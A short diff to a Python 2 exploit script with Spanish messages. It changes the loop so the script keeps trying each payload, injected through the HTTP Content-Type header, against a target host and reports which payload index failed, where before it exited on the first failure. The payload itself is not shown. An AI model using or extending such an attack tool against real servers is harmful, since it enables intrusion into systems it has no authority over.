@@ -151,7 +151,7 @@ if len(host) > 0:
 			print BLUE+"     [-] NO VULNERABLE"+ENDC			
 			print BOLD+" [+] EJECUTANDO EXPLOIT 2"+ENDC
 
-			for valida in validador():
+			for x, valida in enumerate(validador()):
 				try:
 					req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
 					result = urllib2.urlopen(req).read()
@@ -181,8 +181,8 @@ if len(host) > 0:
 							sys.exit(1)
 							print BLUE+"\n BYE :)\n"+ENDC
 					else:
-						print BLUE+"     [-] NO VULNERABLE"+ENDC			
-						sys.exit(1)
+						print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+						pass		
 				except:
 					print OTRO+"\n BYE :(\n"+ENDC
 					sys.exit(1)
@@ -237,8 +237,8 @@ if len(host) > 0:
 							sys.exit(1)
 							print BLUE+"\n BYE :)\n"+ENDC
 					else:
-						print BLUE+"     [-] NO VULNERABLE"+ENDC			
-						sys.exit(1)
+						print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+						pass
 				except:
 					print OTRO+"\n BYE :(\n"+ENDC
 					sys.exit(1)
